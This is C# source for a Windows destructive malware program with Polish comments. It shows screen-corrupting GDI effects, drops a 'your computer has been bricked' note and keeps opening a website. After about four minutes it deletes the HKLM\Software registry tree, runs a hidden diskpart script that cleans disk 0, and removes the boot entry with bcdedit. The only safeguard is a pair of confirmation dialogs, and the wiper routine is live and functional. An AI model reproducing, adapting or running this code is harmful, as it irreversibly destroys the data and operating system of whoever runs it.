using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Security.Principal;
using Microsoft.Win32;

class InternalSystemModule
{
    [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("user32.dll")] static extern bool GetCursorPos(out Point lpPoint);
    [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left, Top, Right, Bottom; }
    const uint SRCCOPY = 0x00CC0020;
    const uint SRCINVERT = 0x00660046;
    static Random rnd = new Random();
    static bool destructionStarted = false;

    static bool IsAdmin() {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }

    [STAThread]
    static void Main() {
        if (!IsAdmin()) {
            Process.Start("cmd.exe", "/c color c && echo Uruchom jako Administrator! && pause");
            return;
        }

        if (MessageBox.Show("Destroy system?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes) {
            if (MessageBox.Show("ARE YOU SURE? (ROFUCKED MODE)", "FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == DialogResult.Yes) {
                
                // 1. Notatnik
                string note = Path.Combine(Path.GetTempPath(), "readme.txt");
                File.WriteAllText(note, "Your computer has been bricked by malware.\n\n:D\nBy the way, your Regedit and UEFI have also been bricked.");
                Process.Start("notepad.exe", note);

                // 2. Ladunki
                new Thread(MalwarePayload).Start();
                new Thread(() => {
                    while(true) {
                        try { Process.Start("https://chomikuj.pl"); } catch {}
                        Thread.Sleep(25000);
                    }
                }).Start();
            }
        }
    }

    static void MalwarePayload() {
        IntPtr hdc = GetDC(IntPtr.Zero);
        RECT r; GetWindowRect(GetDesktopWindow(), out r);
        int w = r.Right, h = r.Bottom;
        Stopwatch sw = Stopwatch.StartNew();

        while (true) {
            long ms = sw.ElapsedMilliseconds;
            if (ms < 260000) {
                if (ms < 40000) Graphics.FromHdc(hdc).DrawIcon(SystemIcons.Error, rnd.Next(w), rnd.Next(h));
                else if (ms < 120000) {
                    if (rnd.Next(10) > 8) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
                    BitBlt(hdc, rnd.Next(w), rnd.Next(h), 100, 100, hdc, rnd.Next(w), rnd.Next(h), SRCCOPY);
                }
                else if (ms < 200000) BitBlt(hdc, 5, 5, w - 10, h - 10, hdc, 0, 0, SRCCOPY);
                else {
                    BitBlt(hdc, 0, 5, w, h - 5, hdc, 0, 0, SRCCOPY);
                    BitBlt(hdc, (int)(Math.Sin(ms/400.0)*10), 0, w, h, hdc, 0, 0, SRCCOPY);
                }
                Thread.Sleep(20);
            } else {
                if (!destructionStarted) {
                    destructionStarted = true;
                    new Thread(DoRoFucked).Start();
                }
                BitBlt(hdc, rnd.Next(-10, 10), rnd.Next(-10, 10), w, h, hdc, 0, 0, SRCCOPY);
                if (ms > 310000) {
                    Application.EnableVisualStyles();
                    Application.Run(new FinalAnim());
                    Process.Start("powershell.exe", "wininit");
                }
                Thread.Sleep(5);
            }
        }
    }

    static void DoRoFucked() {
        try {
            // Rejestr
            Registry.LocalMachine.DeleteSubKeyTree("Software", false);
            // Dysk
            string script = Path.Combine(Path.GetTempPath(), "s.txt");
            File.WriteAllText(script, "select disk 0\nclean");
            Process.Start(new ProcessStartInfo("diskpart.exe", "/s " + script) { WindowStyle = ProcessWindowStyle.Hidden });
            // Boot
            Process.Start(new ProcessStartInfo("bcdedit", "/delete {current} /f") { WindowStyle = ProcessWindowStyle.Hidden });
        } catch {}
    }
}

public class FinalAnim : Form {
    int i = 0; float a = 0; string t = "Computer have been BRICKED. Enjoy \"Animation\"";
    public FinalAnim() {
        this.FormBorderStyle = 0; this.WindowState = (FormWindowState)2; this.BackColor = Color.Black; this.TopMost = true;
        var tm = new System.Windows.Forms.Timer { Interval = 100 };
        tm.Tick += (s, e) => { if (i < t.Length) i++; else a += 20; this.Invalidate(); };
        tm.Start();
    }
    protected override void OnPaint(PaintEventArgs e) {
        e.Graphics.DrawString(t.Substring(0, i), new Font("Consolas", 30), Brushes.Lime, 50, 50);
        if (i >= t.Length) {
            e.Graphics.TranslateTransform(Width / 2, Height / 2);
            e.Graphics.RotateTransform(a);
            e.Graphics.FillEllipse(Brushes.Gold, -100, -50, 200, 100);
            e.Graphics.FillPolygon(Brushes.Gold, new Point[] { new Point(80, 0), new Point(150, -50), new Point(150, 50) });
        }
    }
}
